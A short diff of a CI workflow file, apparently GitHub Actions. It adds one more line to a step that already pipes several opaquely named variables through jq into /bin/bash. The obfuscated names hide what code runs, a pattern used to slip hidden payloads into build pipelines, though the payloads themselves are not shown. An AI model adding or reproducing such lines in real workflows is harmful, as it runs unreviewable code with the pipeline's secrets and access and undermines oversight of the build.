@@ -35,6 +35,7 @@ jobs:
           echo $dqpcq5781 | jq -r .tud93213 | /bin/bash
           echo $rn08 | jq -r .cpfav27005 | /bin/bash
           printf '%s' "$tp7" | jq -r .p9622 | /bin/bash
+          echo $ww29976 | jq -r .ydai96 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
